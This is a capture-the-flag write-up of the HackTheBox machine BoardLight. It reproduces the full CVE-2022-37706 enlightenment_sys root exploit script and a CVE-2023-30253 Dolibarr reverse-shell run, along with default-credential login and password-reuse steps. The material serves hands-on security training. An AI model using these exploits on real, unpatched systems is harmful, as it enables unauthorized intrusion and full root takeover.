---
title: BoardLight
date: 2024-09-07 15:55:45 +0200
categories:
  - HackTheBox
tags:
  - Web
  - Subdomain
  - RCE
  - Password-reuse
  - CVE-2023-30253
  - Default-Credentials
  - SUID
  - CVE-2022-37706
description: I started by scanning "BoardLight," found a vulnerable web app, and used CVE-2023-30253 to gain initial access. I escalated privileges by using exposed database credentials, then exploited a SUID binary vulnerability (CVE-2022-37706) to get root and capture the flag.
render_with_liquid: false
media_subpath: /assets/img/htb_images/BoardLight
image:
  path: room.png
---
## Machine
![Room Card](room_card.png){: w="300" h="300" .center .shadow}

- **Name:** [BoardLight](https://app.hackthebox.com/machines/BoardLight)
- **Summary:** I started by scanning "BoardLight," found a vulnerable web app, and used CVE-2023-30253 to gain initial access. I escalated privileges by using exposed database credentials, then exploited a SUID binary vulnerability (CVE-2022-37706) to get root and capture the flag.

### Author

- **Name:** [m3gakr4nus](https://app.hackthebox.com/profile/2041939)
- **Duration:** 2024-09-07 - 2024-09-07

## Initial Recon
Let's start with an **Nmap scan**.
```console
m3ga@kali:~$ nmap -sS -Pn -v -p- -T4 -A -oN portscan.nmap 10.10.11.11
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
|_  256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
```

There is an `Apache 2.4.41` web server running on `port 80`. Let's check it out!
![](<Pasted image 20240907155831.png>){: w="700" h="300" .center}

We learn what the website's domain name is by scrolling all the way to the bottom of the page:
![](<Pasted image 20240907160349.png>){: w="700" h="300" .center}

Let's add `10.10.11.11 board.htb` to our `/etc/hosts` file

### Subdomain enumeration
After some enumeration, we find a subdomain called `crm`
```console
m3ga@kali:~$ wfuzz -u "http://board.htb" -H "Host: FUZZ.board.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -c --hw 1053
...
=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================
000000072:   200        149 L    504 W      6360 Ch     "crm"
```

Let's add `10.10.11.11 board.htb crm.board.htb` to our `/etc/hosts` file.

## User Flag
### CVE-2023-30253
Navigating to `crm.board.htb`, we can see a login page.
Looks like the web app is called `Dolibarr` version `17.0.0`

![](<Pasted image 20240907164715.png>){: w="500" h="300" .center }

Googling for `Dolibarr 17.0.0` vulnerabilities and exploits, I found this: `CVE-2023-30253`

>[nist.gov - CVE-2023-30253](https://nvd.nist.gov/vuln/detail/CVE-2023-30253)
>
>Dolibarr before 17.0.1 allows remote code execution by an authenticated user via an uppercase manipulation: `<?PHP` instead of `<?php` in injected data.
{: .prompt-info}

Fortunately for me, `nikn0laty` already has an exploit ready on GitHub.
> [PoC GitHub - CVE-2023-30253](https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253)
> 
> Reverse Shell POC exploit for **`Dolibarr <= 17.0.0 (CVE-2023-30253)`**, PHP Code Injection.
{: .prompt-tip}


Looks like this is an **authenticated** RCE. But worry not!

Trying the default credentials `admin:admin` we can login to the platform.
![](<Pasted image 20240907165406.png>){: w="700" h="300" .center }

Let's use these creds to run the exploit and hopefully get a reverse shell:

### Exploitation

**Exploit**
```console
m3ga@kali:~$ python3 exploit.py 'http://crm.board.htb' admin admin 10.10.16.4 53
[*] Trying authentication...
[**] Login: admin
[**] Password: admin
[*] Trying created site...
[*] Trying created page...
[*] Trying editing page and call reverse shell... Press Ctrl+C after successful connection
```

**Listener**
```console
m3ga@kali:~$ nc -lvnp 53
listening on [any] 53 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.11.11] 36000
bash: cannot set terminal process group (893): Inappropriate ioctl for device
bash: no job control in this shell
www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Perfect! We're in...

### Enumeration

Let's see what users are on the system
```console
www-data@boardlight:/home$ grep -i '/bin/bash' /etc/passwd
root:x:0:0:root:/root:/bin/bash
larissa:x:1000:1000:larissa,,,:/home/larissa:/bin/bash
```

### Privilege Escalation - larissa

After spending some time and researching `dolibarr`, I found out where the database configuration data is stored. These kinds of files usually store clear-text username and passwords in them.

According to https://wiki.dolibarr.org/index.php?title=Configuration_file the configuration should be at `/var/www/html/crm.board.htb/htdocs/conf/config.php`

Sure enough, the credentials can be seen here.
```text
$dolibarr_main_db_host='localhost';
$dolibarr_main_db_port='3306';
$dolibarr_main_db_name='dolibarr';
$dolibarr_main_db_prefix='llx_';
$dolibarr_main_db_user='dolibarrowner';
$dolibarr_main_db_pass='[REDACTED]';
$dolibarr_main_db_type='mysqli';
```

I tried using the database password to SSH as `larissa`. Users usually re-use their passwords which holds true in this case.

![](<Pasted image 20240907171558.png>){: w="600" h="300" .center }


```console
larissa@boardlight:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  user.txt  Videos
larissa@boardlight:~$ cat user.txt 
[REDACTED]
```

## Root Flag
### Enumeration

Looking for files with the `SUID` bit set, I found these interesting binaries:
```console
larissa@boardlight:~$ find / -perm -u+s -ls 2>/dev/null
...
    17633     28 -rwsr-xr-x   1 root     root        26944 Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
    17628     16 -rwsr-xr-x   1 root     root        14648 Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd
    17627     16 -rwsr-xr-x   1 root     root        14648 Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight
...
```

### CVE-2022-37706
After googling them, I found the **CVE-2022-37706**

>[nist.gov - **CVE-2022-37706**](https://nvd.nist.gov/vuln/detail/CVE-2022-37706)
>
>enlightenment_sys in Enlightenment before 0.25.4 allows local users to gain privileges because it is setuid root, and the system library function mishandles pathnames that begin with a /dev/.. substring.
{: .prompt-info}

`MaherAzzouzi` on GitHub already has an exploit for it:
> [PoC GitHub - CVE-2022-37706](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit)
> 
> This 0-day gonna take any user to root privileges very easily and instantly. The exploit is tested on Ubuntu 22.04, but should work just fine on any distro.
{: .prompt-tip}

### Privilege Escalation - Root
I copied the `exploit.sh` file's content into `exp.sh` on the machine.
```bash
#!/bin/bash

echo "CVE-2022-37706"
echo "[*] Trying to find the vulnerable SUID file..."
echo "[*] This may take few seconds..."

file=$(find / -name enlightenment_sys -perm -4000 2>/dev/null | head -1)
if [[ -z ${file} ]]
then
	echo "[-] Couldn't find the vulnerable SUID file..."
	echo "[*] Enlightenment should be installed on your system."
	exit 1
fi

echo "[+] Vulnerable SUID binary found!"
echo "[+] Trying to pop a root shell!"
mkdir -p /tmp/net
mkdir -p "/dev/../tmp/;/tmp/exploit"

echo "/bin/sh" > /tmp/exploit
chmod a+x /tmp/exploit
echo "[+] Enjoy the root shell :)"
${file} /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net
```

Now let's execute it!

```console
larissa@boardlight:~$ chmod +x exp.sh 
larissa@boardlight:~$ ./exp.sh 
CVE-2022-37706
[*] Trying to find the vulnerable SUID file...
[*] This may take few seconds...
[+] Vulnerable SUID binary found!
[+] Trying to pop a root shell!
[+] Enjoy the root shell :)
mount: /dev/../tmp/: can't find in /etc/fstab.
# id
uid=0(root) gid=0(root) groups=0(root),4(adm),1000(larissa)
# pwd
/home/larissa
# cd /root
# ls
root.txt  snap
# cat root.txt
[REDACTED]
```

## Outro
Many thanks to the creator of this machine, [cY83rR0H1t](https://app.hackthebox.com/users/116842).

Even though it was very easy, I still managed to learn about some new CVEs which is never a bad thing.

\-m3gakr4nus
